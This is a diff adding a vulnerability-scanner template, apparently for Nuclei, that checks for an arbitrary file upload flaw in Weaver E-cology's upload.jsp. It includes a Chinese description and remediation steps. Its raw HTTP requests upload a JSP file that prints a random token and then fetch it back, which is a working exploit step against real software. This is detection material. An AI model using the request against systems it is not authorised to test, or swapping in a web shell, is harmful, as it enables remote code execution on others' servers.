@@ -1,0 +1,56 @@
+id: wooyun-2014-076547
+info:
+  name: 泛微e-cology upload.jsp 任意文件上传漏洞检测
+  author:
+  - 折跃
+  description: |-
+    泛微 E-cology upload.jsp 任意文件上传漏洞
+    泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台，e-cology可形成一系列的通用解决方案和行业解决方案。
+
+    泛微 E-cology中存在任意文件上传漏洞。远程攻击者可以利用该漏洞上传文件并执行代码。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.weaver.com.cn/
+
+    临时修复方案：
+    1、服务器端将文件上传目录直接设置为不可执行。
+    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。
+    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
+    4、单独设置文件服务器的域名。
+    5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。
+    6、修复服务器可能存在的解析漏洞。
+    7、严格限制可以修改服务器配置的文件上传如：.htaccess。
+    8、隐藏上传文件路径。
+    9、及时修复Web上传代码。
+    10、不能有本地文件包含漏洞。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1==200
+    - status_code_2==200
+    - contains(body_2,verify)
+  raw:
+  - |
+    POST /tools/SWFUpload/upload.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=---------------------------17911526049915903093347900923
+
+    -----------------------------17911526049915903093347900923
+    Content-Disposition: form-data; name="test"; filename="{{fileName}}.jsp"
+    Content-Type: application/octet-stream
+
+    <%@ page import="java.util.*,java.io.*" %>
+    <%@ page import="java.io.*"%>
+    <% out.println("{{verify}}");%>
+    -----------------------------17911526049915903093347900923
+  - |
+    GET /null{{uploadFile}}.jsp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  fileName: '{{rand_text_alphanumeric(8,"")}}'
+  verify: '{{rand_text_alphanumeric(32,"")}}'
